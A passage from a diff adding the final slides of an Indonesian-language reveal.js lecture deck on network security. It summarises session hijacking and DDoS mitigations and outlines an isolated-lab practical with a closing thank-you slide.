+                        <li>✓ Mitigasi: <strong>Defense in Depth</strong> + DDoS protection service</li>
+                    </ul>
+                </div>
+                <div class="card" style="margin-top: 1em;">
+                    <h4 style="color: var(--color-accent);">Session Hijacking:</h4>
+                    <ul>
+                        <li>✓ Mencuri <strong>Session ID</strong> untuk akses akun tanpa password</li>
+                        <li>✓ Bahaya: WiFi publik, XSS, MITM</li>
+                        <li>✓ Mitigasi: <strong>HTTPS + Secure Cookie + Session Management</strong></li>
+                        <li>✓ Users: Hindari WiFi publik, gunakan VPN, logout setelah selesai</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Slide 26: Praktikum -->
+            <section>
+                <h2>🧪 Praktikum Minggu Ini</h2>
+                <div class="card">
+                    <h4 style="color: var(--color-accent);">Apa yang Akan Kita Lakukan:</h4>
+                    <ol style="font-size: 1em;">
+                        <li><strong>DoS Simulation:</strong> Demo serangan DoS sederhana di lab environment</li>
+                        <li><strong>Packet Analysis:</strong> Identifikasi paket serangan dengan Wireshark</li>
+                        <li><strong>Session Sniffing:</strong> Demo session hijacking (ethical lab only!)</li>
+                        <li><strong>Mitigation Practice:</strong> Konfigurasi rate limiting dan secure cookies</li>
+                    </ol>
+                </div>
+                <div class="warning">
+                    ⚠️ SEMUA praktikum dilakukan di lingkungan LAB TERISOLASI<br>
+                    ⚠️ TIDAK BOLEH mencoba di sistem/jaringan nyata tanpa izin!
+                </div>
+            </section>
+
+            <!-- Slide 27: Q&A -->
+            <section class="centered">
+                <h1 style="font-size: 5em;">❓</h1>
+                <h2>Pertanyaan?</h2>
+                <p style="font-size: 1.3em; margin-top: 1em;">Mari berdiskusi!</p>
+                <div style="margin-top: 2em; opacity: 0.8;">
+                    <p>Ingat: Tidak ada pertanyaan yang bodoh.</p>
+                    <p>Bertanya = Tanda Anda belajar! 🧠</p>
+                </div>
+            </section>
+
+            <!-- Slide 28: Thank You -->
+            <section class="centered" data-background-gradient="linear-gradient(135deg, #667eea 0%, #764ba2 100%)">
+                <h1 style="font-size: 4em;">🙏</h1>
+                <h1>Terima Kasih!</h1>
+                <p style="font-size: 1.5em; margin-top: 1em;">Sampai jumpa di praktikum!</p>
+                <div style="margin-top: 2em;">
+                    <p style="font-size: 1.1em;">Jangan lupa:</p>
+                    <p style="font-size: 1.3em; color: var(--color-accent); font-weight: 600;">
+                        🛡️ Always Use Your Power for GOOD, Not EVIL! 🛡️
+                    </p>
+                </div>
+            </section>
+
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/reveal.min.js"></script>
+    <script>
+        Reveal.initialize({
+            hash: true,
+            transition: 'slide',
+            transitionSpeed: 'default',
+            backgroundTransition: 'fade',
+            slideNumber: true,
+            controls: true,
+            progress: true,
+            center: false,
+            width: 1280,
+            height: 720,
+            margin: 0.04,
+            
+            // Plugins
+            plugins: []
+        });
+    </script>
+</body>
+</html>
